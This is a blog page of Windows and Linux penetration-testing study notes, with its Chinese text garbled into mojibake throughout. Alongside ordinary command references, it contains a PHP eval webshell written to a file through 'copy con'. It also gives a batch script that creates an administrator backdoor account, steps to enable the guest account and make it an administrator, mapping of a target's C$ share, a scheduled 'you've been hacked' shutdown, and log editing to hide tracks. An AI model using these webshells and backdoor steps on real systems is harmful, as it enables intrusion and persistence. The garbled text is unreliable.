<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>ğŸ¼ Study [æŒç»­æ›´æ–°] - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://47.95.140.43/typora_pic/background.JPG"><div class="post-title"><h1 class="title">ğŸ¼ Study [æŒç»­æ›´æ–°]</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>36 Minutes</li><li><i class="icon icon-calendar"></i>April 5, 2018</li></ul></div></div><div class="article-content" style="max-width:800px"><h1 id="ğŸ¼-Study"><a href="#ğŸ¼-Study" class="headerlink" title="ğŸ¼ Study"></a><center>ğŸ¼ Study</center></h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h3><ul>
<li>c:\system32\config\SAM <strong>å­˜æ”¾ç³»ç»Ÿè´¦å·å’Œå¯†ç </strong> </li>
<li>c:\system32\drivers\etc\hosts æœ¬åœ°åŸŸåè§£ææ–‡ä»¶</li>
<li>ç”¨æˆ·å®¶ç›®å½•\å¯èƒ½ä¼šæœ‰ä¸€äº›ç¨‹åºçš„ç¼“å­˜ä¿¡æ¯ï¼Œæ¯”å¦‚æ•°æ®åº“è¿æ¥ nvicatï¼ŒQQï¼Œæµè§ˆå™¨ cookieï¼Œ3389 è¿æ¥ç­‰ç­‰ï¼Œå¯ä»¥åšä¸€ä¸ªæœ¬åœ°ä¿¡æ¯æ”¶é›†ã€‚</li>
</ul>
<h3 id="æœåŠ¡"><a href="#æœåŠ¡" class="headerlink" title="æœåŠ¡"></a>æœåŠ¡</h3><ul>
<li><p>win+R-&gt;service.msc è‡ªåŠ¨ã€æ‰‹åŠ¨ã€ç¦ç”¨ã€ä¾èµ–å…³ç³»ã€‚</p>
</li>
<li><p><strong>ç«¯å£</strong>ï¼ˆä¿¡æ¯æ”¶é›†ï¼Œç›®æ ‡æ¢æµ‹ï¼ŒæœåŠ¡åˆ¤æ–­ï¼Œç³»ç»Ÿåˆ¤æ–­ï¼Œç³»ç»Ÿè§’è‰²åˆ†æï¼‰</p>
<ul>
<li>web 80 https 443 smb 445</li>
<li>FTP 21 tftp 69</li>
<li>ssh 22</li>
<li>SMTP 25</li>
<li>1-1024 ç³»ç»Ÿé¢„ç•™ä¸€éƒ¨åˆ†ç«¯å£</li>
<li>é˜²ç«å¢™ä¸èƒ½é˜²æœ¨é©¬ç—…æ¯’ï¼Œä½†å¯ä»¥é€šè¿‡ç¦æ­¢ç‰¹å®šç«¯å£é™åˆ¶å›è¿ï¼Œæ¯”å¦‚å†°æ²³é»˜è®¤é“¾æ¥ç«¯å£æ˜¯7626</li>
</ul>
</li>
<li><p>æ³¨å†Œè¡¨</p>
<ul>
<li><p>Windows æ ¸å¿ƒæ•°æ®åº“</p>
</li>
<li><p>win+R-&gt;regeit</p>
</li>
<li><p>machine-&gt;SAM å­˜æ”¾ç™»å½•ä¿¡æ¯</p>
</li>
<li><p>machine-&gt;software-&gt;microsoft-&gt;windows-&gt;currentversion-&gt;run å¼€æœºè¿è¡Œ</p>
<p>æˆ– win+R-&gt;msconfig</p>
</li>
</ul>
</li>
</ul>
<h3 id="DOS-å‘½ä»¤"><a href="#DOS-å‘½ä»¤" class="headerlink" title="DOS å‘½ä»¤"></a>DOS å‘½ä»¤</h3><ul>
<li><p>cls æ¸…å±</p>
</li>
<li><p>systeminfo çœ‹æ˜¯å¦æ‰“è¡¥ä¸ï¼Œç„¶åæ‰“å¼€å·¥å…·åŒ…åˆ©ç”¨ææƒ</p>
</li>
<li><p>arp -a çœ‹ arp ç¼“å­˜è¡¨ï¼Œæ¥çœ‹å†…ç½‘æœ‰å“ªäº›ä¸»æœº</p>
</li>
<li><p>net view æŸ¥çœ‹å±€åŸŸç½‘å†…å…¶ä»–è®¡ç®—æœºçš„åç§°</p>
</li>
<li><p>shutdown -s -t 180 -c â€œä½ è¢«é»‘äº†â€</p>
</li>
<li><p>dir æŸ¥çœ‹ç›®å½•</p>
</li>
<li><p>copy con c:\abcd.txt</p>
<?php @eval($_POST['muma']);?>

<p>control + Z + enter ä¿å­˜</p>
<ul>
<li>æŸ¥çœ‹ notepad c:\abcd.txt    ï¼ˆè®°äº‹æœ¬ä¸­æ‰“å¼€ï¼‰<ul>
<li>type c:\abcd.txt ï¼ˆå‘½ä»¤è¡Œä¸­æ‰“å¼€ï¼‰</li>
</ul>
</li>
</ul>
</li>
<li><p>åˆ é™¤æ–‡ä»¶ del c:\abcd.txt</p>
</li>
<li><p>md 123 æ–°å»ºç›®å½•</p>
</li>
<li><p>ren 1.txt 3.txt</p>
</li>
<li><p>copy å¤åˆ¶</p>
</li>
<li><p>move ç§»åŠ¨</p>
</li>
<li><p>tree æ ‘å½¢æŸ¥çœ‹ç›®å½•ç»“æ„</p>
</li>
<li><p>telnet æ¢æµ‹ç«¯å£å¼€æ”¾</p>
</li>
<li><p>æ˜ å°„ç›˜ç¬¦</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use k: \\192.168.0.105\c$ æ˜ å°„ç›˜ç¬¦ æŠŠç›®æ ‡æœåŠ¡å™¨cç›˜å½“æˆkæ˜ å°„å‡ºæ¥ k:åè¦æœ‰ç©ºæ ¼</span><br></pre></td></tr></table></figure>
</li>
<li><p>net start çœ‹ç³»ç»Ÿå¼€äº†å“ªäº›æœåŠ¡</p>
<p>net stop â€œwindows searchâ€ ä¸­æ­¢æœåŠ¡</p>
</li>
<li><p>net user æŸ¥çœ‹ç”¨æˆ·</p>
<p>net user test 12345 /add æ·»åŠ ç”¨æˆ·</p>
<p>net user test æŸ¥çœ‹testç”¨æˆ·</p>
<p>net localgroup administrators test /add æ·»åŠ teståˆ°ç®¡ç†å‘˜ç»„</p>
<p>net localgroup administrators æŸ¥çœ‹ç®¡ç†å‘˜ç»„</p>
<p>net user test 123.com æ”¹å¯†ç </p>
<p>net user test /del åˆ é™¤ç”¨æˆ·</p>
<p><strong>å¯ç”¨æœªæ¿€æ´»çš„ç”¨æˆ·</strong></p>
<p>net user guest æŸ¥çœ‹æ¥å®¾ç”¨æˆ·</p>
<p>net user guest /active:yes æ¿€æ´»æ¥å®¾ç”¨æˆ·</p>
<p>net user guest 123.com è®¾ç½®å¯†ç </p>
<p>net localgroup administrators guest /add æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„</p>
<p>net localgroup administrators guest /del ç§»å‡º</p>
<p>net user guest /active:no ç¦ç”¨guest</p>
</li>
<li><p>net share æŸ¥çœ‹å…±äº«</p>
<p>net share c$ /del å…³é—­å…±äº«</p>
</li>
<li><p>at 21:58 shutdown -s -t 180 è®¾ç½®è®¡åˆ’ä»»åŠ¡</p>
<p>at æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡åˆ—è¡¨</p>
<p>at 1 /del</p>
</li>
<li><p>tasklist è¿›ç¨‹</p>
<p>taskkill /f /im notepad.exe ç»“æŸè¿›ç¨‹ï¼Œä½†æ˜¯æ— æ³•ç»“æŸæ€è½¯</p>
</li>
<li><p>å»ºç«‹ä¸€ä¸ªæ‰¹å¤„ç†æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy con a.bat</span><br><span class="line">net user nick 123 /add</span><br><span class="line">net localgroup administrators nick /add</span><br><span class="line">ctrl+Z+enter</span><br></pre></td></tr></table></figure>
</li>
<li><p>msg ç”¨æˆ·å å‘é€ä¿¡æ¯</p>
</li>
</ul>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>LInux å¯ä»¥è¿è¡Œ aspï¼Œä½†æ˜¯æ¯”è¾ƒéº»çƒ¦</p>
<h2 id="ç›®å½•-1"><a href="#ç›®å½•-1" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h2><p>/bin binary äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå­˜æ”¾ç³»ç»Ÿå‘½ä»¤ï¼Œpsï¼Œlsï¼Œpingç­‰</p>
<p>/sbin rootæƒé™æ‰å¯ä»¥ä½¿ç”¨çš„ä¸€äº›å‘½ä»¤ï¼Œæ¯”å¦‚iptablesï¼Œrebootï¼Œifconfigï¼Œswaponç­‰</p>
<p>/etc ç³»ç»Ÿæˆ–ç¨‹åºçš„ä¸€äº›é…ç½®æ–‡ä»¶ï¼Œä¹ŸåŒ…å«ç”¨äºå¯åŠ¨æˆ–åœæ­¢å•ä¸ªç¨‹åºçš„è„šæœ¬ï¼Œæ¯”å¦‚/etc/resolve.conf</p>
<p>/dev Device Files è®¾å¤‡æ–‡ä»¶ï¼ŒåŒ…æ‹¬ç»ˆç«¯è®¾å¤‡ï¼ŒUSBç­‰ï¼Œæ¯”å¦‚/dev/tty1ï¼Œ/dev/usbmon0</p>
<p>/proc Process Information è¿›ç¨‹ä¿¡æ¯ï¼Œè™šæ‹Ÿçš„æ–‡ä»¶ç³»ç»Ÿï¼Œç³»ç»Ÿèµ„æºä»¥æ–‡æœ¬ä¿¡æ¯å½¢å¼å­˜åœ¨</p>
<p>/var variable files å˜é‡æ–‡ä»¶ï¼Œå†…å®¹å¯èƒ½å¢é•¿çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ç³»ç»Ÿæ—¥å¿—/var/logï¼Œæ•°æ®åº“æ–‡ä»¶/var/libï¼Œé”æ–‡ä»¶/var/lockï¼Œå¤šæ¬¡é‡æ–°å¯åŠ¨éœ€è¦çš„ä¸´æ—¶æ–‡ä»¶/var/tmp</p>
<p>/tmp ä¸´æ—¶æ–‡ä»¶ï¼Œå½“ç³»ç»Ÿé‡æ–°å¯åŠ¨æ—¶ï¼Œè¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½ä¼šè¢«åˆ é™¤</p>
<p>/usr ç”¨æˆ·ç¨‹åºï¼Œæ¯”å¦‚ä»æºå®‰è£…apacheï¼Œå®ƒä¼šåœ¨/usr/local/apache2ä¸­ï¼Œè¿˜æœ‰/usr/binå’Œ/usr/sbinç”¨åˆ°çš„åº“åœ¨/usr/libä¸­</p>
<p>/home ç”¨æˆ·å®¶ç›®å½•</p>
<p>/boot å¼•å¯¼åŠ è½½ç¨‹åºæ–‡ä»¶ï¼ŒLinuxå¯åŠ¨çš„æ ¸å¿ƒæ–‡ä»¶ï¼ŒåŒ…å«å†…æ ¸çš„initrdã€vmlinuxã€grubç­‰</p>
<p>/lib system library ç³»ç»Ÿåº“ï¼Œç±»ä¼¼äºWindowsçš„.dllæ–‡ä»¶ï¼ŒåŒ…å«æ”¯æŒä½äº/binå’Œ/sbinä¸‹çš„äºŒè¿›åˆ¶æ–‡ä»¶çš„åº“</p>
<p>/opt optional add-on apps å¯é€‰çš„é™„åŠ åº”ç”¨ç¨‹åº</p>
<p>/mnt mount directory ä¸´æ—¶æŒ‚è½½ç›®å½•</p>
<p>/media å¯ç§»åŠ¨åª’ä½“è®¾å¤‡ï¼Œä¹Ÿå¯ç”¨æ¥æŒ‚è½½</p>
<p>/srv service data åŒ…å«æœåŠ¡å™¨ç‰¹å®šæœåŠ¡ç›¸å…³çš„æ•°æ®</p>
<h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><ul>
<li><p>df æ£€æŸ¥ linux æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿç£ç›˜ç©ºé—´å ç”¨æƒ…å†µ</p>
<p>-T æ–‡ä»¶ç³»ç»Ÿç±»å‹</p>
</li>
<li><p>mount æŒ‚è½½ umount å¸è½½</p>
</li>
<li><p>$ æ™®é€šç”¨æˆ·æƒé™ # ç®¡ç†å‘˜æƒé™</p>
</li>
<li><p>âŒƒ + U æ¸…ç©ºè‡³è¡Œé¦–ï¼Œ+ K æ¸…ç©ºè‡³è¡Œå°¾ï¼Œ+ L æ¸…å±ï¼Œ\ + enter å¼ºåˆ¶æ¢è¡Œ</p>
</li>
<li><p>uname -r æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬å·ï¼š<strong>ææƒç¬¬ä¸€æ­¥</strong></p>
<p><a href="https://www.exploit-db.com" target="_blank" rel="noopener">https://www.exploit-db.com</a></p>
<p>-n è¯¦ç»†æŸ¥çœ‹</p>
</li>
<li><p>hostname <strong>å¯ä»¥åˆ¤æ–­è®¡ç®—æœºåœ¨ç½‘ç»œä¸­çš„èº«ä»½</strong></p>
</li>
<li><p>cat /porc/cpuinfo cpuä¿¡æ¯</p>
</li>
<li><p>cat /proc/meminfo  å†…å­˜ä¿¡æ¯</p>
</li>
<li><p>drwxrwxrwx</p>
<p>r-4 w-2 x-1</p>
</li>
<li><p>du ç»Ÿè®¡ç›®å½•æˆ–æ–‡ä»¶å ç”¨ç©ºé—´æƒ…å†µ Â° -sh /etc</p>
</li>
<li><p>mkdir -p a/b/c é€’å½’åˆ›å»ºç›®å½•</p>
<p>ls -R é€’å½’æŸ¥çœ‹</p>
</li>
<li><p>touch * <strong>åˆ·æ–°æ—¶é—´</strong></p>
</li>
<li><p>copy -r å¸¦ç›®å½•å¤åˆ¶ -rf ä¸å¸¦æç¤º</p>
</li>
<li><p>find [æŸ¥æ‰¾èŒƒå›´] [æŸ¥æ‰¾æ¡ä»¶]</p>
<p>find / -name re*.conf</p>
<p>find / -user nick</p>
<p>find / -size</p>
<p>find / -type</p>
</li>
<li><p><strong>vim ç¼–è¾‘å™¨</strong></p>
<ul>
<li>è®¾ç½®è¡Œå· å‘½ä»¤æ¨¡å¼ä¸‹ set nu</li>
<li>a å…‰æ ‡åç¼–è¾‘ï¼ŒA è¡Œå°¾ç¼–è¾‘</li>
<li>yy å¤åˆ¶ p ç²˜è´´</li>
<li>æ¯”å¦‚è¯´è¦å¤åˆ¶4è¡Œï¼Œå…ˆæŒ‰4å†æŒ‰yyï¼Œç„¶åpå¤åˆ¶</li>
<li>/install æŸ¥æ‰¾ï¼Œnä¸‹ä¸€ä¸ªï¼ŒNä¸Šä¸€ä¸ª</li>
<li>?install å‘ä¸ŠæŸ¥æ‰¾</li>
<li>r æ›¿æ¢ R æ•´è¡Œæ›¿æ¢<ul>
<li>%s/.conf/php/g å…¨å±€æ›¿æ¢ï¼Œs ä»£è¡¨æœç´¢ï¼Œæ‰¾åˆ°æ‰€æœ‰çš„ .conf æ›¿æ¢æˆ phpï¼Œ<strong>å¯ä»¥ç”¨äºä¿®æ”¹æ—¥å¿—</strong></li>
<li>750,760s/nick/aaa/g</li>
<li>.,$d å…‰æ ‡æ‰€åœ¨ä½ç½®åˆ é™¤åˆ°æœ€åã€‚. ä»£è¡¨å…‰æ ‡ä½ç½® $ è¡¨ç¤ºæœ€å</li>
</ul>
</li>
<li>746 å…‰æ ‡ç›´æ¥åˆ° 746 è¡Œ</li>
<li><strong>e! æ¢å¤åˆ°åˆšæ‰“å¼€çš„æ—¶å€™çš„çŠ¶æ€</strong></li>
</ul>
</li>
<li><p>wc ç»Ÿè®¡å­—ç¬¦</p>
</li>
<li><p><strong>å‹ç¼©</strong>  gzip/bzip2 -9 é«˜åº¦å‹ç¼©</p>
<ul>
<li>gzip test.txt test.txt.gz å‹ç¼©</li>
<li>gzip -d è§£å‹</li>
<li>bzip2 test.txt test.txt.bz2</li>
<li>bzip2 -d è§£å‹</li>
</ul>
</li>
<li><p><strong>æ‰“åŒ…/å½’æ¡£</strong></p>
<ul>
<li>tar -cvf a.tar[ç”Ÿæˆæ–‡ä»¶å]    a.txt[è¦æ‰“åŒ…çš„æ–‡ä»¶å] </li>
<li>tar -tvf a.tar æŸ¥çœ‹é‡Œé¢æœ‰å“ªäº›æ–‡ä»¶</li>
<li>tar -rvf a.tar è¿½åŠ </li>
<li>tar -xvf a.tar æ‹†åŒ…</li>
</ul>
</li>
<li><p>ç›´æ¥è§£å‹ç¼©</p>
<p>å¦‚æœæ˜¯gzipå‹ç¼©            tar zxvf a.tar.gz</p>
<p>å¦‚æœæ˜¯bzip2å‹ç¼©            tar jxvf a.tar.bz2</p>
</li>
<li><p>rpm -ivh xxx å®‰è£…  iè¡¨ç¤ºå®‰è£…ï¼Œvhè¡¨ç¤ºè¯¦ç»†ä¿¡æ¯</p>
<p>rpm -qi çœ‹è½¯ä»¶åŒ…è¯¦ç»†ä¿¡æ¯</p>
<p>rpm -e xxx å¸è½½</p>
</li>
<li><p>setenforce 0 å…³é—­ SELinux</p>
</li>
<li><p>useradd ab æ·»åŠ ç³»ç»Ÿè´¦å· </p>
<ul>
<li>-u æŒ‡å®šuid     -d æŒ‡å®šå®¶ç›®å½•     -e æŒ‡å®šå¤±æ•ˆæ—¶é—´     -s æŒ‡å®šç”¨æˆ·ç™»å½•çš„shell</li>
</ul>
<p>passwd ab è®¾ç½®å¯†ç </p>
<p>userdel ab åˆ é™¤ç”¨æˆ·ab</p>
<ul>
<li><p><strong>ç›®å½•</strong></p>
<ul>
<li><p>/etc/passwd è®°å½•ç”¨æˆ·</p>
<p>æ ¼å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name:password:ID:group ID:comment:home directory:login shell</span><br></pre></td></tr></table></figure>

<p>ä¾‹å­</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">root æœ‰å¯†ç  uID0 groupID0 rootç”¨æˆ· å®¶ç›®å½•/root å¯ä»¥ç™»å½•</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">mail æœ‰å¯†ç  uID8 groupID12 mail å®¶ç›®å½• /var/spool/mail ä¸å¯ç™»å½•</span><br></pre></td></tr></table></figure>
</li>
<li><p>/etc/shadow è®°å½•å¯†ç </p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>netstat -tnlp tcpç«¯å£</p>
<p>netstat -unlp udpç«¯å£</p>
</li>
<li><p>ps -aux æŸ¥çœ‹è¿›ç¨‹ æˆ– top åŠ¨æ€æŸ¥çœ‹</p>
</li>
</ul>
<h2 id="Linux-é…ç½®"><a href="#Linux-é…ç½®" class="headerlink" title="Linux é…ç½®"></a>Linux é…ç½®</h2><h3 id="RedHat"><a href="#RedHat" class="headerlink" title="RedHat"></a>RedHat</h3><h4 id="ç½‘ç»œé…ç½®"><a href="#ç½‘ç»œé…ç½®" class="headerlink" title="ç½‘ç»œé…ç½®"></a>ç½‘ç»œé…ç½®</h4><figure class="highlight vim"><figcaption><span>/etc/sysconfig/network-scripts/ifcfg-eth0```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">BOOTPROTO=dhcp/static</span><br><span class="line"></span><br><span class="line">ONBOOT=yes</span><br><span class="line"></span><br><span class="line">IPADDR=<span class="number">192.168</span>.<span class="number">1.2</span></span><br><span class="line"></span><br><span class="line">NETMASK=<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line"></span><br><span class="line">GATEWAY=<span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"></span><br><span class="line">DNS=<span class="number">114.114</span>.<span class="number">114.114</span></span><br><span class="line"></span><br><span class="line">```é‡å¯ç½‘å¡ service network restart</span><br></pre></td></tr></table></figure>

<h4 id="æœåŠ¡-1"><a href="#æœåŠ¡-1" class="headerlink" title="æœåŠ¡"></a>æœåŠ¡</h4><p>service *.service start/restart/status</p>
<h3 id="CentOS-7"><a href="#CentOS-7" class="headerlink" title="CentOS 7"></a>CentOS 7</h3><h4 id="ç½‘ç»œé…ç½®-1"><a href="#ç½‘ç»œé…ç½®-1" class="headerlink" title="ç½‘ç»œé…ç½®"></a>ç½‘ç»œé…ç½®</h4><figure class="highlight plain"><figcaption><span>/etc/sysconfig/network-scripts```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### æœåŠ¡</span><br><span class="line"></span><br><span class="line">systemctl enable *.service		å¼€æœºè¿è¡ŒæœåŠ¡</span><br><span class="line"></span><br><span class="line">systemctl disable *.service		å–æ¶ˆå¼€æœºè¿è¡Œ</span><br><span class="line"></span><br><span class="line">systemctl start *.service</span><br><span class="line"></span><br><span class="line">systemctl stop *.service</span><br><span class="line"></span><br><span class="line">systemctl restart *.service</span><br><span class="line"></span><br><span class="line">systemctl reload *.service é‡æ–°åŠ è½½æœåŠ¡é…ç½®æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">systemctl status *.service çŠ¶æ€</span><br><span class="line"></span><br><span class="line">### Ubuntu</span><br><span class="line"></span><br><span class="line">#### ç½‘ç»œé…ç½®</span><br><span class="line"></span><br><span class="line">```vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>

<p>auto eth0</p>
<p>iface eth0 inet dhcp/static</p>
<p>address 1.2.3.4</p>
<p>gateway 1.2.3.4</p>
<p>netmask 1.2.3.4</p>
<figure class="highlight plain"><figcaption><span>/etc/init.d/networking restart```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```service networking restart</span><br></pre></td></tr></table></figure>

<p>æŒ‡å®šç½‘å¡é‡å¯   <figure class="highlight plain"><figcaption><span>eth0``` ```ifup eth0```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### æœåŠ¡</span><br><span class="line"></span><br><span class="line">service network restart/stop/status</span><br><span class="line"></span><br><span class="line">### Debian</span><br><span class="line"></span><br><span class="line">#### ç½‘ç»œé…ç½®</span><br><span class="line"></span><br><span class="line">```vim /etc/network/interfaces</span><br></pre></td></tr></table></figure></p>
<p>auto eth0</p>
<p>iface eth0 inet dhcp/static</p>
<p>address 1.2.3.4</p>
<p>gateway 1.2.3.4</p>
<p>netmask 1.2.3.4</p>
<figure class="highlight plain"><figcaption><span>/etc/init.d/networking restart```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### æœåŠ¡</span><br><span class="line"></span><br><span class="line">service network restart/stop/status</span><br><span class="line"></span><br><span class="line">## OSI æœ‰å“ªå‡ å±‚</span><br><span class="line"></span><br><span class="line">7-åº”ç”¨å±‚</span><br><span class="line"></span><br><span class="line">6-è¡¨ç¤ºå±‚									é«˜å±‚è´Ÿè´£ä¸»æœºä¹‹é—´çš„æ•°æ®ä¼ è¾“</span><br><span class="line"></span><br><span class="line">5-ä¼šè¯å±‚</span><br><span class="line"></span><br><span class="line">4-ä¼ è¾“å±‚</span><br><span class="line"></span><br><span class="line">3-ç½‘ç»œå±‚</span><br><span class="line"></span><br><span class="line">2-æ•°æ®é“¾è·¯å±‚							åº•å±‚è´Ÿè´£ç½‘ç»œæ•°æ®çš„ä¼ è¾“</span><br><span class="line"></span><br><span class="line">1-ç‰©ç†å±‚</span><br><span class="line"></span><br><span class="line">## TCP/IP å„ä¸ªå±‚æ¬¡åŠŸèƒ½</span><br><span class="line"></span><br><span class="line">4-åº”ç”¨å±‚				æä¾›åº”ç”¨ç¨‹åºçš„ç½‘ç»œæ¥å£			PDU</span><br><span class="line"></span><br><span class="line">3-ä¼ è¾“å±‚				å»ºç«‹ç«¯åˆ°ç«¯çš„è¿æ¥						Segment</span><br><span class="line"></span><br><span class="line">2-ç½‘ç»œå±‚				å¯»å€å’Œè·¯ç”±é€‰æ‹©							Packet</span><br><span class="line"></span><br><span class="line">1-æ•°æ®é“¾è·¯å±‚/ç‰©ç†å±‚			ç‰©ç†ä»‹è´¨è®¿é—®ã€äºŒè¿›åˆ¶æ¯”ç‰¹æµä¼ è¾“		Frame/Bit</span><br><span class="line"></span><br><span class="line">## è·¯ç”±å™¨ä½œç”¨</span><br><span class="line"></span><br><span class="line">- åšæ•°æ®åŒ…è½¬å‘</span><br><span class="line">- éš”ç»å¹¿æ’­åŸŸ</span><br><span class="line"></span><br><span class="line">## äº¤æ¢æœº</span><br><span class="line"></span><br><span class="line">- å±€åŸŸç½‘é€šä¿¡é äº¤æ¢</span><br><span class="line"></span><br><span class="line">## å¦‚ä½•é˜²å¾¡ä¸­é—´äººæ”»å‡»</span><br><span class="line"></span><br><span class="line">- åšåŒå‘ MAC åœ°å€ç»‘å®šï¼ˆåœ¨è·¯ç”±å™¨å’Œç»ˆç«¯ä¸Šåšï¼‰</span><br></pre></td></tr></table></figure>

<p>  arp -s 192.168.0.1 00-11-ff-22-ss<br>  ```</p>
<h2 id="html-åŸºç¡€"><a href="#html-åŸºç¡€" class="headerlink" title="html åŸºç¡€"></a>html åŸºç¡€</h2><ul>
<li><p>å¸¸ç”¨çš„é—­åˆæ ‡ç­¾ï¼Œé—­åˆä¹‹åæ‰å¯ä»¥è¿è¡Œ XSS</p>
<p>&lt;ol&gt;&lt;/ol&gt;</p>
<p>&lt;il&gt;&lt;/li&gt;</p>
</li>
<li><p>è¡¨å•æ ‡ç­¾&lt;form&gt;â€¦&lt;/form&gt;</p>
<ul>
<li>å±æ€§ actionï¼šæäº¤ç»™å“ªä¸ªé¡µé¢</li>
<li>methodï¼šç”¨ä»€ä¹ˆæ–¹æ³•æäº¤</li>
<li>targetï¼šç›®æ ‡</li>
</ul>
</li>
</ul>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><ul>
<li><p>åŸŸåä¿¡æ¯</p>
<ul>
<li><p>æŸ¥å¯¹åº”IPï¼ŒTTLå€¼ï¼Œåˆæ­¥åˆ¤æ–­æœåŠ¡å™¨ç³»ç»Ÿï¼Œnslookup</p>
</li>
<li><p>æ”¶é›†å­åŸŸå</p>
<p>bbs.baidu.com</p>
<p>edu.baidu.com</p>
<p>å¯ä»¥ä»å­åŸŸåå¼€å§‹æŒ–æ˜æ¼æ´ï¼Œå¯èƒ½æ˜¯æ—ç«™ï¼ŒçœŸå® IP å¯èƒ½ä¹Ÿåœ¨å­åŸŸåä¸Šã€‚</p>
<p>site:â€edu.baidu.comâ€</p>
